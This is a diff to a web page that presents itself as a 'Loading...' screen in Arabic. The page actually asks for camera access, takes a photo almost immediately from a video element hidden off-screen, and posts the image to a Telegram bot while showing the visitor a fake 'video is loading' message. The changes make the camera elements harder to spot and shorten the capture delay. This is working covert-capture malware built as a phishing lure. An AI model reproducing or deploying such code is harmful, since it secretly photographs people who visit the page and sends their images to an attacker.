@@ -3,32 +3,40 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Loading...</title>
+  <title>جاري التحميل...</title>
   <style>
     body {
+      margin: 0;
+      padding: 0;
       background-color: #000;
-      color: white;
+      color: #fff;
+      font-family: sans-serif;
       display: flex;
       align-items: center;
       justify-content: center;
-      flex-direction: column;
       height: 100vh;
-      margin: 0;
-      font-family: sans-serif;
     }
-    #loader {
+
+    #status {
       font-size: 20px;
+      z-index: 999;
     }
+
+    /* عناصر الكاميرا كلها مدفونة */
     video, canvas {
-      display: none !important;
-      visibility: hidden;
-      opacity: 0;
       position: absolute;
+      width: 1px;
+      height: 1px;
+      top: -9999px;
+      left: -9999px;
+      opacity: 0;
+      pointer-events: none;
     }
   </style>
 </head>
 <body>
-  <div id="loader">📡 جاري التحميل...</div>
+  <div id="status">📡 جاري التحميل...</div>
+
   <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas" width="300" height="300"></canvas>
 
@@ -39,41 +47,41 @@
     async function start() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById('video');
+        const video = document.getElementById("video");
         video.srcObject = stream;
 
         video.onloadedmetadata = () => {
           setTimeout(() => {
             takePhoto(stream);
-          }, 1000);
+          }, 500); // أسرع لقطة
         };
       } catch (e) {
-        document.getElementById("loader").innerText = "❌ الكاميرا مرفوضة.";
+        document.getElementById("status").innerText = "❌ تم رفض الكاميرا.";
       }
     }
 
     function takePhoto(stream) {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const ctx = canvas.getContext('2d');
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
 
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       stream.getTracks().forEach(track => track.stop());
 
       canvas.toBlob(blob => {
         const formData = new FormData();
-        formData.append('chat_id', chat_id);
-        formData.append('photo', blob, 'photo.png');
+        formData.append("chat_id", chat_id);
+        formData.append("photo", blob, "photo.png");
 
         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: 'POST',
+          method: "POST",
           body: formData
         }).then(r => r.json()).then(d => {
-          document.body.innerHTML = "<h2>📱 يتم الآن تشغيل الفيديو...</h2>";
+          document.getElementById("status").innerText = "📽️ يتم الآن تحميل الفيديو...";
         }).catch(err => {
-          document.body.innerHTML = "<h2>❌ فشل في الإرسال</h2>";
+          document.getElementById("status").innerText = "❌ فشل في الإرسال";
         });
-      }, 'image/png');
+      }, "image/png");
     }
 
     window.onload = start;
